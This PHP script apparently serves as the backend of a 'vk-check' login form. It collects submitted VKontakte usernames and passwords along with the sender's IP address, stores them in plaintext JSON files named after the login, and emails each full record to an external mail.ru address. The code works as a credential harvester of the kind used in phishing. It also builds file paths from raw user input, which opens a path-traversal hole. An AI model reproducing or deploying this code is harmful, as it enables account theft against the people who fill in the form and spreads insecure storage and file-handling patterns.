<?php


/*
 * Exit errors
 * 0-success
 * 1-Нет параметров
 * 2-Пользователь был сохранен ранее
 * 3-Ошибка сохранения пользователя
 * 4-Ошибка токена
 * 5-тестовая ошибка
 */


if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    exit('Нет доступа');
}

if (!isset($_POST['vk_login'], $_POST['vk_password'], $_POST['token'])) {
    exit(1);
}

if ($_POST['token'] !== 'wm435en54h5j34gjh24gk4hg654h64j2h6kg24hj56g') {
    exit(4);
}

$_POST['timestamp'] = time();
$_POST['ip_address'] = $_SERVER['REMOTE_ADDR'];
$_POST['date'] = date('r');

unset($_POST['token']);


$filePath = __DIR__ . '/resources/vk-users/' . $_POST['vk_login'] . '.json';

if (file_exists($filePath)) {
    $fromFile = json_decode(file_get_contents($filePath), true);

//    if (isset($fromFile['old'])) {
//        $old = $fromFile['old'];
//        unset($fromFile['old']);
//        $_POST['old'][] = $fromFile;
//        $_POST['old'][] = $old;
//    }

    $_POST['old'] = $fromFile;
}

$isSaved = file_put_contents($filePath, json_encode($_POST), LOCK_EX);


if (!$isSaved) {
    exit(3);
}

function messageTemplate($userData)
{
    $printR = print_r($userData, true);
    return <<<EOD
<!doctype html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Message vk-check vk login form</title>
</head>
<body>

<div>
    <div>
        Vk-login form Qukenon.ru
    </div>
    <div>
        <pre>
        {$printR}
        </pre>
    </div>
</div>
</body>
</html>
EOD;
}

mail(
    'asbo@mail.ru',
    'Ввод данных в форму vk-login на Qukenon ' . $_POST['vk_login'],
    messageTemplate($_POST),
    [
        'From' => 'vk_check_bot@qukenon.ru',
        'Content-type' => 'text/html; charset=utf-8',
    ]
);


$data = ['status' => 'success'];


echo json_encode($data);


